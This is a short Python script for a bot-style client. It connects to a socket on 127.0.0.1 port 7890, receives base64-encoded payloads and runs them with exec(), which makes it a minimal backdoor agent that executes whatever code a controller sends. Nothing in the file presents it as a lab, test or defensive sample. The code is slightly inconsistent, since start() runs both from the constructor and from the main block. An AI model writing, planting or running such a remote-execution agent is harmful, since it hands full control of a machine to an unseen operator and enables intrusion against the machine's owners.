import socket
from sys import exit
from base64 import b64decode

class Node:

    def __init__(self):
        self.node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.node_socket.connect(("127.0.0.1", 7890))
        self.start()

    def run(self, command):
        try:
            exec(b64decode(command))
            return True
        except Exception as error:
            return False

    def start(self):
        while True:
            task = self.node_socket.recv(1024)
            if self.run(task):
                break
            else:
                pass

if __name__ == "__main__":
    node = Node()
    node.start()
    exit()
